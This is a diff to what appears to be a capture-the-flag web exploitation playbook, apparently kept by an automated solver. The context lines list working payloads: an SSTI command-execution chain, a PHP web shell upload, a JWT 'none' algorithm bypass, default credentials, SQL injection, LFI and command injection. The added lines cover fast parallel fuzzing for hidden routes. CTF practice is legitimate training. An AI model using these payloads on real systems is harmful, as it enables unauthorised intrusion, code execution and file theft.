@@ -14,6 +14,7 @@
 | **SSTI (Jinja2/Twig)** | Username reflected, `{{7*7}}` | `{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}` | Direct HTTP POST |
 | **Auth Bypass / JWT** | Cookies, Bearer tokens | `{"alg": "none"}` or default `admin:admin` | `jwt.io` / custom python script |
 | **File Upload** | Upload profile picture / documents | `.php`, `.phar`, `.phtml`, `.php5` with `<?php system($_GET['c']); ?>` | `curl -F "file=@shell.php" <url>` |
+| **Hidden Route / Empty 200** | Target returns 200:0 for all standard paths | Parallel `xargs -P 20` curl with filter `[ "$r" != "200:0" ]` | `cat wordlist.txt \| xargs -P 20 -I{} curl ...` |
 
 ---
 
@@ -22,6 +23,7 @@
 - *SQLi (MySQL)*: `' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()-- -`
 - *LFI (PHP Filter)*: `php://filter/convert.base64-encode/resource=flag.php`
 - *Command Injection*: `127.0.0.1; cat /flag*`
+- *Dummy 200 Response Bypass*: Filter out default length bytes `%{size_download}` to expose non-zero hidden endpoints immediately.
 
 ---
 
@@ -30,3 +32,4 @@
 *(Auto-updated when an approach fails or times out so it is never repeated)*
 - Avoid blind brute-forcing without wordlists under 100 lines.
 - Avoid multi-stage XSS exfiltration if direct DOM extraction works.
+- Avoid single-threaded curl requests on routing problems — always use `xargs -P 20` or `ffuf`.
